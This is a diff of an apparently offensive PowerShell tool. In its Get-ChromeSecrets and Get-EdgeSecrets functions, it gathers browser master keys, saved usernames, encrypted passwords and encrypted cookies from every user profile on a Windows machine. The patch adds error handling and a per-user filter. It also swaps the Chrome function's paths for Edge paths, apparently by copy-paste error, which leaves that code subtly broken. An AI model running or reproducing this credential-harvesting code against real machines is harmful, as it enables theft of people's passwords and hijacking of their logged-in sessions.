@@ -4885,41 +4885,44 @@ function Get-ChromeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 	{
 		$UserDir = $Child.FullName
 		$UserName = $Child.Name
-		$User = @{}
-		ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
+		If (($InUserContext -and $UserName -eq $env:USERNAME) -or (-not $InUserContext))
 		{
-			ForEach ($Subfolder2 in @("", "Google"))
+			$User = @{}
+			ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
 			{
-				ForEach ($Subfolder3 in @("", "Default"))
+				ForEach ($Subfolder2 in @("", "Default"))
 				{
-					$FileLocalState =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Local State"
-					If (Test-Path $FileLocalState)
+					ForEach ($Subfolder3 in @("", "Network"))
 					{
-						$Content = Get-Content $FileLocalState
-						$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
-						$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
-						$EncBlobB64_2 = $Content.IndexOf('"}')
-						$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
-						$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
-						$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
-					}
+						$FileLocalState =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Local State"
+						If (Test-Path $FileLocalState)
+						{
+							$Content = Get-Content $FileLocalState
+							$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
+							$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
+							$EncBlobB64_2 = $Content.IndexOf('"}')
+							$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
+							$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
+							$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
+						}
 
-					$FileLoginData = "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Login Data"
-					If (Test-Path $FileLoginData)
-					{
-						$User["FileLoginData"] = $FileLoginData
-					}
+						$FileLoginData = "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Login Data"
+						If (Test-Path $FileLoginData)
+						{
+							$User["FileLoginData"] = $FileLoginData
+						}
 
-					$FileCookies =  "$UserDir\AppData\$Subfolder1\$Subfolder2\Chrome\User Data\$Subfolder3\Cookies"
-					If (Test-Path $FileCookies)
-					{
-						$User["FileCookies"] = $FileCookies
+						$FileCookies =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Cookies"
+						If (Test-Path $FileCookies)
+						{
+							$User["FileCookies"] = $FileCookies
+						}
 					}
 				}
 			}
-		}
 
-		If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+			If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+		}
 	}
 
 	If (($Results.Keys).Count -gt 0)
@@ -4930,67 +4933,81 @@ function Get-ChromeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 			$EncValues = @{}
 			If ($Results[$UserName]["FileLoginData"])
 			{
-				$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
-				$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
-				$ClearValues["URLs"] = @()
-				$ClearValues["Logins"] = @()
-				foreach ($record in $Data)
+				Try
 				{
-					If ($record.signon_realm)
+					$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
+					$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
+					$ClearValues["URLs"] = @()
+					$ClearValues["Logins"] = @()
+					foreach ($record in $Data)
 					{
-						$ClearValues["URLs"] += $record.signon_realm
-					}
-					ElseIf ($record.origin_url)
-					{
-						$ClearValues["URLs"] += $record.origin_url
-					}
-					Else
-					{
-						$ClearValues["URLs"] += "<EmptyURL>"
+						If ($record.signon_realm)
+						{
+							$ClearValues["URLs"] += $record.signon_realm
+						}
+						ElseIf ($record.origin_url)
+						{
+							$ClearValues["URLs"] += $record.origin_url
+						}
+						Else
+						{
+							$ClearValues["URLs"] += "<EmptyURL>"
+						}
+						
+						$ClearValues["Logins"] += $Data.username_value
 					}
 					
-					$ClearValues["Logins"] += $Data.username_value
-				}
-				
-				If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
-				{
-					$EncPwds = [byte[]]@()
-					For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+					If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
 					{
-						$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
-						$EncPwd = $Data.password_value
-						If ($EncPwd) { $EncPwds += ,$EncPwd }
-						Else { Break }
+						$EncPwds = [byte[]]@()
+						For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+						{
+							$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
+							$EncPwd = $Data.password_value
+							If ($EncPwd) { $EncPwds += ,$EncPwd }
+							Else { Break }
+						}
+						$EncValues["Pwds"] = $EncPwds
 					}
-					$EncValues["Pwds"] = $EncPwds
+				}
+				Catch
+				{
+					Write-Host("[-] Failed to read {0}: {1}" -f ($Results[$UserName]["FileLoginData"], $_))
 				}
 			}
 
 			If ($Results[$UserName]["FileCookies"])
 			{
-				$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
-				$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
-				$ClearValues["HostKeys"] = @()
-				$ClearValues["Names"] = @()
-				$ClearValues["Paths"] = @()
-				foreach ($record in $Data)
+				Try
 				{
-					$ClearValues["HostKeys"] += $Data.host_key
-					$ClearValues["Names"] += $Data.name
-					$ClearValues["Paths"] += $Data.path
-				}
-				
-				If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
-				{
-					$EncCookies = [byte[]]@()
-					For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+					$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
+					$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
+					$ClearValues["HostKeys"] = @()
+					$ClearValues["Names"] = @()
+					$ClearValues["Paths"] = @()
+					foreach ($record in $Data)
 					{
-						$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
-						$EncCookie = $Data.encrypted_value
-						If ($EncCookie) { $EncCookies += ,$EncCookie }
-						Else { Break }
+						$ClearValues["HostKeys"] += $Data.host_key
+						$ClearValues["Names"] += $Data.name
+						$ClearValues["Paths"] += $Data.path
 					}
-					$EncValues["Cookies"] = $EncCookies
+					
+					If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
+					{
+						$EncCookies = [byte[]]@()
+						For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+						{
+							$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
+							$EncCookie = $Data.encrypted_value
+							If ($EncCookie) { $EncCookies += ,$EncCookie }
+							Else { Break }
+						}
+						$EncValues["Cookies"] = $EncCookies
+					}
+				}
+				Catch
+				{
+					Write-Host("[-] Failed to read {0}: {1}" -f ($Results[$UserName]["FileCookies"], $_))
 				}
 			}
 
@@ -5101,41 +5118,44 @@ function Get-EdgeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 	{
 		$UserDir = $Child.FullName
 		$UserName = $Child.Name
-		$User = @{}
-		ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
+		If (($InUserContext -and $UserName -eq $env:USERNAME) -or (-not $InUserContext))
 		{
-			ForEach ($Subfolder2 in @("", "Default"))
+			$User = @{}
+			ForEach ($Subfolder1 in @("Local", "Roaming", "LocalLow"))
 			{
-				ForEach ($Subfolder3 in @("", "Network"))
+				ForEach ($Subfolder2 in @("", "Default"))
 				{
-					$FileLocalState =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Local State"
-					If (Test-Path $FileLocalState)
+					ForEach ($Subfolder3 in @("", "Network"))
 					{
-						$Content = Get-Content $FileLocalState
-						$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
-						$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
-						$EncBlobB64_2 = $Content.IndexOf('"}')
-						$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
-						$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
-						$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
-					}
+						$FileLocalState =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Local State"
+						If (Test-Path $FileLocalState)
+						{
+							$Content = Get-Content $FileLocalState
+							$EncBlobB64_1 = $Content.IndexOf('"encrypted_key":"')
+							$Content = $Content.Substring($EncBlobB64_1 + 17, $Content.Length - 1 - ($EncBlobB64_1 + 17))
+							$EncBlobB64_2 = $Content.IndexOf('"}')
+							$EncBlobB64 = $Content.Substring(0, $EncBlobB64_2)
+							$EncBlob = [System.Convert]::FromBase64String($EncBlobB64)
+							$User["EncLocalState"] = $EncBlob[5..$($EncBlob.Length-1)]
+						}
 
-					$FileLoginData = "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Login Data"
-					If (Test-Path $FileLoginData)
-					{
-						$User["FileLoginData"] = $FileLoginData
-					}
+						$FileLoginData = "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Login Data"
+						If (Test-Path $FileLoginData)
+						{
+							$User["FileLoginData"] = $FileLoginData
+						}
 
-					$FileCookies =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Cookies"
-					If (Test-Path $FileCookies)
-					{
-						$User["FileCookies"] = $FileCookies
+						$FileCookies =  "$UserDir\AppData\$Subfolder1\Microsoft\Edge\User Data\$Subfolder2\$Subfolder3\Cookies"
+						If (Test-Path $FileCookies)
+						{
+							$User["FileCookies"] = $FileCookies
+						}
 					}
 				}
 			}
-		}
 
-		If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+			If ($User["EncLocalState"] -or $User["FileLoginData"] -or $User["FileCookies"]) { $Results[$UserName] = $User }
+		}
 	}
 
 	If (($Results.Keys).Count -gt 0)
@@ -5146,67 +5166,81 @@ function Get-EdgeSecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 			$EncValues = @{}
 			If ($Results[$UserName]["FileLoginData"])
 			{
-				$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
-				$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
-				$ClearValues["URLs"] = @()
-				$ClearValues["Logins"] = @()
-				foreach ($record in $Data)
+				Try
 				{
-					If ($record.signon_realm)
+					$DB = [SqliteHelper]::Open($Results[$UserName]["FileLoginData"])
+					$Data = [SqliteHelper]::Execute($DB, 'SELECT signon_realm, origin_url, username_value FROM logins')
+					$ClearValues["URLs"] = @()
+					$ClearValues["Logins"] = @()
+					foreach ($record in $Data)
 					{
-						$ClearValues["URLs"] += $record.signon_realm
-					}
-					ElseIf ($record.origin_url)
-					{
-						$ClearValues["URLs"] += $record.origin_url
-					}
-					Else
-					{
-						$ClearValues["URLs"] += "<EmptyURL>"
+						If ($record.signon_realm)
+						{
+							$ClearValues["URLs"] += $record.signon_realm
+						}
+						ElseIf ($record.origin_url)
+						{
+							$ClearValues["URLs"] += $record.origin_url
+						}
+						Else
+						{
+							$ClearValues["URLs"] += "<EmptyURL>"
+						}
+						
+						$ClearValues["Logins"] += $Data.username_value
 					}
 					
-					$ClearValues["Logins"] += $Data.username_value
-				}
-				
-				If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
-				{
-					$EncPwds = [byte[]]@()
-					For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+					If ($ClearValues["Logins"] -and $ClearValues["Logins"].Length -gt 0)
 					{
-						$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
-						$EncPwd = $Data.password_value
-						If ($EncPwd) { $EncPwds += ,$EncPwd }
-						Else { Break }
+						$EncPwds = [byte[]]@()
+						For ($Offset = 0; $Offset -lt $ClearValues["Logins"].Length; $Offset += 1)
+						{
+							$Data = [SqliteHelper]::Execute($DB, "SELECT password_value FROM logins LIMIT 1 OFFSET $Offset")
+							$EncPwd = $Data.password_value
+							If ($EncPwd) { $EncPwds += ,$EncPwd }
+							Else { Break }
+						}
+						$EncValues["Pwds"] = $EncPwds
 					}
-					$EncValues["Pwds"] = $EncPwds
+				}
+				Catch
+				{
+					Write-Host("[-] Failed to read {0}: {1}" -f ($Results[$UserName]["FileLoginData"], $_))
 				}
 			}
 
 			If ($Results[$UserName]["FileCookies"])
 			{
-				$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
-				$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
-				$ClearValues["HostKeys"] = @()
-				$ClearValues["Names"] = @()
-				$ClearValues["Paths"] = @()
-				foreach ($record in $Data)
+				Try
 				{
-					$ClearValues["HostKeys"] += $Data.host_key
-					$ClearValues["Names"] += $Data.name
-					$ClearValues["Paths"] += $Data.path
-				}
-				
-				If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
-				{
-					$EncCookies = [byte[]]@()
-					For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+					$DB = [SqliteHelper]::Open($Results[$UserName]["FileCookies"])
+					$Data = [SqliteHelper]::Execute($DB, 'SELECT host_key, name, path FROM cookies')
+					$ClearValues["HostKeys"] = @()
+					$ClearValues["Names"] = @()
+					$ClearValues["Paths"] = @()
+					foreach ($record in $Data)
 					{
-						$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
-						$EncCookie = $Data.encrypted_value
-						If ($EncCookie) { $EncCookies += ,$EncCookie }
-						Else { Break }
+						$ClearValues["HostKeys"] += $Data.host_key
+						$ClearValues["Names"] += $Data.name
+						$ClearValues["Paths"] += $Data.path
 					}
-					$EncValues["Cookies"] = $EncCookies
+					
+					If ($ClearValues["Names"] -and $ClearValues["Names"].Length -gt 0)
+					{
+						$EncCookies = [byte[]]@()
+						For ($Offset = 0; $Offset -lt $ClearValues["Names"].Length; $Offset += 1)
+						{
+							$Data = [SqliteHelper]::Execute($DB, "SELECT encrypted_value FROM cookies LIMIT 1 OFFSET $Offset")
+							$EncCookie = $Data.encrypted_value
+							If ($EncCookie) { $EncCookies += ,$EncCookie }
+							Else { Break }
+						}
+						$EncValues["Cookies"] = $EncCookies
+					}
+				}
+				Catch
+				{
+					Write-Host("[-] Failed to read {0}: {1}" -f ($Results[$UserName]["FileCookies"], $_))
 				}
 			}
 
